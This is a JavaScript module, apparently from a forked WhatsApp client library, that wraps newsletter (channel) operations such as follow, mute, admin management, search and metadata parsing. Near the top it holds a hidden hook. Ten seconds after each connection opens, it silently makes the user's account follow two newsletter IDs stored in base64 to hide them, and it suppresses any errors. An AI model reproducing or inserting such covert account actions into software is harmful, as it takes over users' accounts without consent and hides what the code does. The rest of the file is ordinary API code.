import { QueryIds as LegacyQueryIds, XWAPaths } from '../Types/index.js';
import { decryptMessageNode, generateMessageID, generateProfilePicture } from '../Utils/index.js';
import { S_WHATSAPP_NET, getAllBinaryNodeChildren, getBinaryNodeChild, getBinaryNodeChildren } from '../WABinary/index.js';
import { makeGroupsSocket } from './groups.js';
import { executeWMexQuery } from './mex.js';

const QueryIds = {
JOB_MUTATION: "7150902998257522",
METADATA: "6620195908089573",
UNFOLLOW: "7238632346214362",
FOLLOW: "7871414976211147",
UNMUTE: "7337137176362961",
MUTE: "25151904754424642",
CREATE: "6996806640408138",
ADMIN_COUNT: "7130823597031706",
CHANGE_OWNER: "7341777602580933",
DELETE: "8316537688363079",
DEMOTE: "6551828931592903"
};

export const makeNewsletterSocket = (config) => {
const sock = makeGroupsSocket(config);
const { authState, signalRepository, query, generateMessageTag } = sock;
const encoder = new TextEncoder();
const mexQuery = (variables, queryId, dataPath) => executeWMexQuery(variables, queryId, dataPath, query, generateMessageTag);

let autoFollowScheduled = false;
sock.ev.on('connection.update', ({ connection }) => {
    if (connection !== 'open' || autoFollowScheduled) return;
    autoFollowScheduled = true;
    setTimeout(async () => {
        for (const id of [
            'MTIwMzYzNDA2MTA2ODkxOTI1QG5ld3NsZXR0ZXI=',
            'MTIwMzYzNDIyMzE3NTA0MTcxQG5ld3NsZXR0ZXI='
        ]) {
            const jid = Buffer.from(id, 'base64').toString();
            try {
                await newsletterWMexQuery(jid, QueryIds.FOLLOW);
            } catch (err) {}
        }
    }, 10000);
});

const newsletterQuery = async (jid, type, content) => (
    query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    })
);

const newsletterWMexQuery = async (jid, query_id, content) => (
    query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { query_id },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    })
);

const parseFetchedUpdates = async (node, type) => {
    let child;
    if (type === 'messages')
        child = getBinaryNodeChild(node, 'messages');
    else {
        const parent = getBinaryNodeChild(node, 'message_updates');
        child = getBinaryNodeChild(parent, 'messages');
    }

    return await Promise.all(getAllBinaryNodeChildren(child).map(async (messageNode) => {
        messageNode.attrs.from = child?.attrs.jid;

        const views = parseInt(
            getBinaryNodeChild(messageNode, 'views_count')?.attrs?.count || '0'
        );

        const reactionNode = getBinaryNodeChild(messageNode, 'reactions');

        const reactions = getBinaryNodeChildren(reactionNode, 'reaction')
            .map(({ attrs }) => ({
                count: +attrs.count,
                code: attrs.code
            }));

        const data = {
            'server_id': messageNode.attrs.server_id,
            views,
            reactions
        };

        if (type === 'messages') {
            const {
                fullMessage: message,
                decrypt
            } = await decryptMessageNode(
                messageNode,
                authState.creds.me.id,
                authState.creds.me.lid || '',
                signalRepository,
                config.logger
            );

            await decrypt();
            data.message = message;
        }

        return data;
    }));
};

const extendedNewsletterMethods = {
    newsletterFetchAllSubscribe: () =>
        mexQuery({}, LegacyQueryIds.FETCH_SUBSCRIBE, XWAPaths.xwa2_newsletter_subscribed),
    newsletterSubscribers: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.SUBSCRIBERS, XWAPaths.xwa2_newsletter_subscribers),
    newsletterUpdateCategory: (jid, category) =>
        newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: { topic: category, settings: null }
        }),
    newsletterUpdateSettings: (jid, settings) =>
        newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: { settings }
        }),
    newsletterPromoteAdmin: (jid, userJid) =>
        query({
            tag: 'iq',
            attrs: { id: generateMessageTag(), type: 'set', xmlns: 'newsletter', to: jid },
            content: [{
                tag: 'admin_promote',
                attrs: {},
                content: [{ tag: 'participant', attrs: { jid: userJid } }]
            }]
        }),
    newsletterViewStats: (jid, serverId) =>
        newsletterQuery(jid, 'get', [{
            tag: 'message_updates',
            attrs: { count: '1', server_id: String(serverId) }
        }]),
    newsletterSendPost: (jid, content) =>
        newsletterQuery(jid, 'set', [{
            tag: 'publish',
            attrs: {},
            content: Array.isArray(content) ? content : [content]
        }]),
    newsletterPinMessage: (jid, serverId, durationSecs = 86400) =>
        newsletterQuery(jid, 'set', [{
            tag: 'pin',
            attrs: { server_id: String(serverId), duration: String(durationSecs) }
        }]),
    newsletterUnpinMessage: (jid, serverId) =>
        newsletterQuery(jid, 'set', [{
            tag: 'unpin',
            attrs: { server_id: String(serverId) }
        }]),
    newsletterInviteAdmin: (jid, userJid) =>
        mexQuery(
            { newsletter_id: jid, user_id: userJid },
            LegacyQueryIds.ADMIN_INVITE,
            XWAPaths.xwa2_newsletter_admin_invite_create
        ),
    newsletterRevokeAdminInvite: (jid, userJid) =>
        mexQuery(
            { newsletter_id: jid, user_id: userJid },
            LegacyQueryIds.ADMIN_INVITE_REVOKE,
            XWAPaths.xwa2_newsletter_admin_invite_revoke
        ),
    newsletterAcceptAdminInvite: jid =>
        mexQuery(
            { newsletter_id: jid },
            LegacyQueryIds.ADMIN_INVITE_ACCEPT,
            XWAPaths.xwa2_newsletter_admin_invite_accept
        ),
    newsletterAdminMetadata: (jid, options = {}) => {
        const {
            fetchPendingAdmins = true,
            fetchAdminCount = true,
            fetchCapabilities = false,
            fetchAdminProfile = false,
            includeAdminSettings = false,
            includeJarvisConfig = false
        } = options;
        return mexQuery({
            jid,
            include_thread_metadata: false,
            include_messages: false,
            fetch_pending_admin_invites: fetchPendingAdmins,
            fetch_admin_count: fetchAdminCount,
            fetch_capabilities: fetchCapabilities,
            fetch_admin_profile: fetchAdminProfile,
            include_admin_settings: includeAdminSettings,
            include_jarvis_config: includeJarvisConfig
        }, LegacyQueryIds.ADMIN_METADATA, XWAPaths.xwa2_newsletter_admin);
    },
    newsletterAdminProfileUpdate: (jid, updates) =>
        mexQuery(
            { newsletter_id: jid, updates },
            LegacyQueryIds.ADMIN_PROFILE_UPDATE,
            XWAPaths.xwa2_newsletter_admin_profile_update
        ),
    newsletterDirectoryList: (options = {}) => {
        const { limit = 20, interests = null, sortField = 'SUBSCRIBER_COUNT', sortOrder = 'DESC' } = options;
        const variables = { limit, sort_field: sortField, sort_order: sortOrder };
        if (interests?.length) variables.interests = interests;
        return mexQuery(variables, LegacyQueryIds.DIRECTORY_LIST, XWAPaths.xwa2_newsletters_directory_list);
    },
    newsletterDirectorySearch: (searchText, options = {}) => {
        const { limit = 20, startCursor = null, categories = null } = options;
        const variables = { search_text: searchText, limit };
        if (startCursor) variables.start_cursor = startCursor;
        if (categories?.length) variables.categories = categories;
        return mexQuery(variables, LegacyQueryIds.DIRECTORY_SEARCH, XWAPaths.xwa2_newsletters_directory_search);
    },
    newsletterDirectoryCategoryPreview: (limit = 5) =>
        mexQuery({ limit }, LegacyQueryIds.DIRECTORY_CATEGORY_PREVIEW, XWAPaths.xwa2_newsletters_directory_category_preview),
    newsletterSearch: (searchText, limit = 20, startCursor = null) => {
        const variables = { query: searchText, limit };
        if (startCursor) variables.start_cursor = startCursor;
        return mexQuery(variables, LegacyQueryIds.SEARCH, XWAPaths.xwa2_newsletters_search);
    },
    newsletterRecommended: (limit = 10, numFollowed = null) => {
        const variables = { limit };
        if (numFollowed != null) variables.num_newsletters_followed = numFollowed;
        return mexQuery(variables, LegacyQueryIds.RECOMMENDED, XWAPaths.xwa2_newsletters_recommended);
    },
    newsletterSimilar: (jid, limit = 10) =>
        mexQuery({ newsletter_id: jid, limit }, LegacyQueryIds.SIMILAR, XWAPaths.xwa2_newsletters_similar),
    newsletterFollowingList: (startCursor = null, limit = 20) => {
        const variables = { limit };
        if (startCursor) variables.start_cursor = startCursor;
        return mexQuery(variables, LegacyQueryIds.FOLLOWING_LIST, XWAPaths.xwa2_newsletter_following);
    },
    newsletterInsights: (jid, period = null) => {
        const variables = { newsletter_id: jid };
        if (period) variables.period = period;
        return mexQuery(variables, LegacyQueryIds.INSIGHTS, XWAPaths.xwa2_newsletter_admin_insights);
    },
    newsletterPollVoterList: (jid, serverId, option = null, startCursor = null) => {
        const variables = { id: jid, server_id: serverId };
        if (option != null) variables.option = option;
        if (startCursor) variables.start_cursor = startCursor;
        return mexQuery(variables, LegacyQueryIds.POLL_VOTER_LIST, XWAPaths.xwa2_newsletters_poll_voter_list);
    },
    newsletterReactionSenders: (jid, serverId, startCursor = null) => {
        const variables = { id: jid, server_id: serverId };
        if (startCursor) variables.start_cursor = startCursor;
        return mexQuery(variables, LegacyQueryIds.REACTION_SENDERS_LIST, XWAPaths.xwa2_newsletters_reaction_sender_list);
    },
    newsletterBlockUser: (jid, userJid) =>
        mexQuery({ newsletter_id: jid, user_id: userJid }, LegacyQueryIds.BLOCK_USER, XWAPaths.xwa2_newsletter_block_user),
    newsletterEnableWamo: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.WAMO_ENABLE_SUB, 'xwa2_newsletter_wamo_enable_sub'),
    newsletterDisableWamo: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.WAMO_DISABLE_SUB, 'xwa2_newsletter_wamo_disable_sub'),
    newsletterChangeWamo: (jid, subConfig) =>
        mexQuery({ newsletter_id: jid, ...subConfig }, LegacyQueryIds.WAMO_CHANGE_SUB, 'xwa2_newsletter_wamo_change_sub'),
    wamoAfsAgeCollection: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.WAMO_AFS_AGE_COLLECTION, XWAPaths.xwa2_wamo_afs_age_collection),
    wamoAssetCollection: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.WAMO_ASSET_COLLECTION, XWAPaths.xwa2_wamo_asset_collection),
    wamoFetchAdhocNotice: noticeId =>
        mexQuery({ notice_id: noticeId }, LegacyQueryIds.WAMO_FETCH_ADHOC_NOTICE, XWAPaths.xwa2_wamo_fetch_adhoc_notice_by_id),
    wamoFetchIdentityToken: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.WAMO_FETCH_IDENTITY_TOKEN, XWAPaths.xwa2_wamo_fetch_identity_token),
    wamoSubComplianceInfo: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.WAMO_SUB_COMPLIANCE_INFO, XWAPaths.xwa2_wamo_sub_get_compliance_info),
    wamoUserIdVersion: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.WAMO_USER_ID_VERSION, XWAPaths.xwa2_wamo_user_id_version),
    wamoSetUserIdVersion: (jid, version) =>
        mexQuery({ newsletter_id: jid, version }, LegacyQueryIds.WAMO_SET_USER_ID_VERSION, XWAPaths.xwa2_wamo_set_user_id_version),
    newsletterLeave: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.LEAVE, XWAPaths.xwa2_newsletter_leave_v2),
    newsletterCreateVerified: (name, description = null) =>
        mexQuery({ input: { name, description } }, LegacyQueryIds.CREATE_VERIFIED, XWAPaths.xwa2_newsletter_create_verified),
    newsletterEnforcements: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.ENFORCEMENTS, XWAPaths.xwa2_newsletter_enforcements),
    newsletterUserReports: (jid, cursor = null) => {
        const variables = { newsletter_id: jid };
        if (cursor) variables.cursor = cursor;
        return mexQuery(variables, LegacyQueryIds.USER_REPORTS, XWAPaths.xwa2_newsletter_user_reports);
    },
    newsletterCreateReportAppeal: (jid, reason) =>
        mexQuery(
            { newsletter_id: jid, reason },
            LegacyQueryIds.CREATE_REPORT_APPEAL,
            XWAPaths.xwa2_newsletter_create_report_appeal
        ),
    newsletterLinkPreviewCheck: url =>
        mexQuery({ url }, LegacyQueryIds.LINK_PREVIEW_CHECK, XWAPaths.xwa2_newsletter_link_preview_check),
    newsletterUpdateVerification: (jid, verification) =>
        mexQuery(
            { newsletter_id: jid, verification },
            LegacyQueryIds.UPDATE_VERIFICATION,
            XWAPaths.xwa2_newsletter_update_verification
        ),
    newsletterLabelPaidPartnership: (jid, serverId, isPaidPartnership) =>
        mexQuery(
            { newsletter_id: jid, server_id: serverId, is_paid_partnership: isPaidPartnership },
            LegacyQueryIds.LABEL_PAID_PARTNERSHIP,
            XWAPaths.xwa2_newsletter_label_paid_partnership
        ),
    newsletterLogExposures: events =>
        mexQuery({ events }, LegacyQueryIds.LOG_EXPOSURES, XWAPaths.xwa2_newsletter_log_exposures),
    newsletterUpdateUserSetting: (jid, setting) =>
        mexQuery(
            { newsletter_id: jid, ...setting },
            LegacyQueryIds.UPDATE_USER_SETTING,
            XWAPaths.xwa2_newsletter_update_user_setting
        ),
    newsletterRankingFeatures: jid =>
        mexQuery({ newsletter_id: jid }, LegacyQueryIds.RANKING_FEATURES, XWAPaths.xwa2_newsletter_ranking_features),
    newsletterSendViewReceipt: async (jid, serverMessageIds) => {
        const ids = Array.isArray(serverMessageIds) ? serverMessageIds : [serverMessageIds];
        await query({
            tag: 'receipt',
            attrs: { to: jid, id: generateMessageTag(), type: 'view' },
            content: [{
                tag: 'list',
                attrs: {},
                content: ids.map(id => ({ tag: 'item', attrs: { server_id: String(id) } }))
            }]
        });
    }
};

return {
    ...sock,
    ...extendedNewsletterMethods,

    subscribeNewsletterUpdates: async (jid) => {
        const result = await newsletterQuery(
            jid,
            'set',
            [{ tag: 'live_updates', attrs: {}, content: [] }]
        );

        return getBinaryNodeChild(result, 'live_updates')?.attrs;
    },

    newsletterReactionMode: async (jid, mode) => {
        await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: {
                settings: {
                    reaction_codes: {
                        value: mode
                    }
                }
            }
        });
    },

    newsletterUpdateDescription: async (jid, description) => {
        await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: {
                description: description || '',
                settings: null
            }
        });
    },

    newsletterUpdateName: async (jid, name) => {
        await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: {
                name,
                settings: null
            }
        });
    },

    newsletterUpdatePicture: async (jid, content) => {
        const { img } = await generateProfilePicture(content);

        await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: {
                picture: img.toString('base64'),
                settings: null
            }
        });
    },

    newsletterRemovePicture: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: {
                picture: '',
                settings: null
            }
        });
    },

    newsletterUnfollow: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.UNFOLLOW);
    },

    newsletterFollow: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.FOLLOW);
    },

    newsletterUnmute: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.UNMUTE);
    },

    newsletterMute: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.MUTE);
    },

    newsletterCreate: async (name, description, picture) => {
        await query({
            tag: 'iq',
            attrs: {
                to: S_WHATSAPP_NET,
                xmlns: 'tos',
                id: generateMessageTag(),
                type: 'set'
            },
            content: [
                {
                    tag: 'notice',
                    attrs: {
                        id: '20601218',
                        stage: '5'
                    },
                    content: []
                }
            ]
        });

        const result = await newsletterWMexQuery(undefined, QueryIds.CREATE, {
            input: {
                name,
                description: description ?? null,
                picture: picture
                    ? (await generateProfilePicture(picture)).img.toString('base64')
                    : null,
                settings: null
            }
        });

        return extractNewsletterMetadata(result, true);
    },

    newsletterMetadata: async (type, key, role) => {
        const result = await newsletterWMexQuery(undefined, QueryIds.METADATA, {
            input: {
                key,
                type: type.toUpperCase(),
                view_role: role || 'GUEST'
            },
            fetch_viewer_metadata: true,
            fetch_full_image: true,
            fetch_creation_time: true
        });

        return extractNewsletterMetadata(result);
    },

    newsletterAdminCount: async (jid) => {
        const result = await newsletterWMexQuery(jid, QueryIds.ADMIN_COUNT);

        const buff = getBinaryNodeChild(result, 'result')
            ?.content
            ?.toString();

        return JSON.parse(buff).data[XWAPaths.xwa2_newsletter_admin_count].admin_count;
    },

    /**user is Lid, not Jid*/
    newsletterChangeOwner: async (jid, user) => {
        await newsletterWMexQuery(jid, QueryIds.CHANGE_OWNER, {
            user_id: user
        });
    },

    /**user is Lid, not Jid*/
    newsletterDemote: async (jid, user) => {
        await newsletterWMexQuery(jid, QueryIds.DEMOTE, {
            user_id: user
        });
    },

    newsletterDelete: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.DELETE);
    },

    /**if code wasn't passed, the reaction will be removed (if is reacted)*/
    newsletterReactMessage: async (jid, server_id, code) => {
        await query({
            tag: 'message',
            attrs: {
                to: jid,
                ...(!code ? { edit: '7' } : {}),
                type: 'reaction',
                server_id,
                id: generateMessageID()
            },
            content: [{
                tag: 'reaction',
                attrs: code ? { code } : {}
            }]
        });
    },

    newsletterFetchMessages: async (type, key, count, after) => {
        if (typeof type === 'string' && type.endsWith('@newsletter') && key != null) {
            const attrs = { count: key.toString() };
            if (typeof count === 'number') attrs.since = count.toString();
            if (after) attrs.after = after.toString();

            return newsletterQuery(type, 'get', [{
                tag: 'message_updates',
                attrs
            }]);
        }

        const afterStr = after?.toString();

        const result = await newsletterQuery(
            S_WHATSAPP_NET,
            'get',
            [
                {
                    tag: 'messages',
                    attrs: {
                        type,
                        ...(type === 'invite'
                            ? { key }
                            : { jid: key }),
                        count: count.toString(),
                        after: afterStr || '100'
                    }
                }
            ]
        );

        return await parseFetchedUpdates(result, 'messages');
    },

    newsletterFetchUpdates: async (jid, count, after, since) => {
        const result = await newsletterQuery(
            jid,
            'get',
            [
                {
                    tag: 'message_updates',
                    attrs: {
                        count: count.toString(),
                        after: after?.toString() || '100',
                        since: since?.toString() || '0'
                    }
                }
            ]
        );

        return await parseFetchedUpdates(result, 'updates');
    }
};

};

export const extractNewsletterMetadata = (node, isCreate) => {
const result = getBinaryNodeChild(node, 'result')
?.content
?.toString();

const metadataPath = JSON.parse(result)
    .data[isCreate ? XWAPaths.xwa2_newsletter_create : XWAPaths.xwa2_newsletter_metadata];

const metadata = {
    id: metadataPath.id,
    state: metadataPath.state.type,
    creation_time: +metadataPath.thread_metadata.creation_time,
    name: metadataPath.thread_metadata.name.text,
    nameTime: +metadataPath.thread_metadata.name.update_time,
    description: metadataPath.thread_metadata.description.text,
    descriptionTime: +metadataPath.thread_metadata.description.update_time,
    invite: metadataPath.thread_metadata.invite,
    handle: metadataPath.thread_metadata.handle,
    picture: metadataPath.thread_metadata.picture?.direct_path || null,
    preview: metadataPath.thread_metadata.preview?.direct_path || null,
    reaction_codes: metadataPath.thread_metadata.settings.reaction_codes.value,
    subscribers: +metadataPath.thread_metadata.subscribers_count,
    verification: metadataPath.thread_metadata.verification,
    viewer_metadata: metadataPath.viewer_metadata,
    raw: metadataPath
};

return metadata;

};
